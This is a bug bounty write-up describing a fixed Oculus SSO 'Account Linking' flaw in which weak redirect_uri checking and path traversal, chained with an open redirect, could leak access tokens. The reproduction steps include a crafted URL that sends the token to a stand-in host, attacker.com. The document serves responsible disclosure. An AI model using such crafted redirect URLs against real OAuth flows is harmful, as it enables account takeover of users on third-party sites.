---
id: 697
title: 'Oculus SSO &#8220;Account Linking&#8221; bug leads to account takeover on third party websites and inside VR Games/Apps'
date: '2021-05-20T10:36:57+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=697'
wp_featherlight_disable:
    - ''
categories:
    - Uncategorized
---

**Description**

This bug allows an attacker to manipulate the callback endpoint that would receive the Oculus access token used by third-party websites that chose to use the Oculus “Account Linking” feature which enables an Organisation to link a certain Oculus account with his/her website account. This would lead to account takeover if the attacker could chain this bug with another one in the receiving website (open redirect ) to leak the token to his website.

**Reproduction Steps**

1\) I’ll reproduce this behaviour against the Oculus Forums ( **forums.oculusvr.com** ) however any Organization is affected that uses Oculus SSO since the problem is in the Oculus endpoint and not in the configuration set by the developer.

2\) If you visit **https://forums.oculusvr.com/** and choose to login you’ll be redirect to this :

https://auth.oculus.com/sso/?redirect_uri=**https://forums.oculusvr.com/hucou38897/plugins/custom/facebook/fboculus/custom.oauthsso-redirect**&amp;organization_id=695304644729285

3\) Since there are no exact matching of value in the redirect_uri and the one selected by the developer in the Oraganization SSO settings ( additional characters could be added after the chosen redirect_uri but of course can’t modify the selected one ) and also there’s no filtering of characters combinations like dots and and a slash ( ../ ), an attacker could change this URL for example to this :

https://auth.oculus.com/sso/?redirect_uri=**https://forums.oculusvr.com/hucou38897/plugins/custom/facebook/fboculus/custom.oauthsso-redirect/../../../../../../open_redirect?next=https://www.attacker.com**&amp;organization_id=695304644729285

4\) The access token would be sent to **https://forums.oculusvr.com/open_redirect?next=https://www.attacker.com#eyJjb2RlIjoib3hoSlB** . The endpoint **open_redirect** was used as an example of an endpoint that would redirect the user from the receiving website to an external one. Since the token is in the fragment of the URL, the browser would carry it to the next URL that would receive it and store it.

5\) Here the attacker can use the token to login to the Oculus user forums account for this example. Other examples of applications that uses the SSO could be using the token to identify users accounts in VR games.

This type of bugs is very common in OAuth authentication flows and i didn’t expect it to exist in Facebook’s products. For that, i encourage to always check for small and common issues before looking for complex ones.

**Impact**

An attacker could leak a user’s authorization code as they linked their Oculus account to a third-party app using the OAuth flow. The attacker could then use this authorization code to link their own third-party app account to the targeted user’s Oculus account. This scenario would require an open redirect within the third-party app. We have fixed this issue.

**Timeline**

Feb 26, 2021— Report Sent   
Mar 2, 2021— Acknowledged by Facebook  
Mar 16, 2021— Fixed by Facebook  
Apr 13, 2021— Additional mitigation and investigation by Facebook  
May 20, 2021 — $12000 bounty awarded by Facebook (Including bonus).